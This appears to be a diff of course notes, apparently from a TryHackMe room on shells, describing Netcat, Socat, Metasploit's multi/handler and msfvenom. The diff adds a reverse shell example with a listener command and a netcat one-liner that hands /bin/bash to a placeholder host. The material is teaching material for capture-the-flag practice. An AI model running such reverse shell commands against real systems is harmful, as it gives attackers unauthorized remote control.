@@ -21,11 +21,11 @@ There are a variety of tools that we will be using to receive reverse shells and
 
 ---
 
-*Netcat:*
+**Netcat:**
 
 Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.
 
-*Socat:*
+**Socat:**
 
 Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:
 
@@ -35,11 +35,11 @@ There are work arounds to both of these problems, which we will cover later on.
 
 Both Socat and Netcat have .exe versions for use on Windows.
 
-*Metasploit – multi/handler:*
+**Metasploit – multi/handler:**
 
 The exploit/multi/handler module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads – both of which we will look at in task 9.
 
-*Msfvenom:*
+**Msfvenom:**
 
 Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.
 
@@ -58,3 +58,18 @@ As a general rule, reverse shells are easier to execute and debug, however, we w
 
 ---
 
+**Reverse Shell example:**
+
+Let's start with the more common reverse shell.
+
+Nine times out of ten, this is what you'll be going for -- especially in CTF challenges like those of TryHackMe.
+
+Take a look at the following image. On the left we have a reverse shell listener -- this is what receives the connection. On the right is a simulation of sending a reverse shell. In reality, this is more likely to be done through code injection on a remote website or something along those lines. Picture the image on the left as being your own computer, and the image on the right as being the target.
+
+On the attacking machine:
+
+sudo nc -lvnp 443
+
+On the target:
+
+_nc <LOCAL-IP> <PORT> -e /bin/bash_
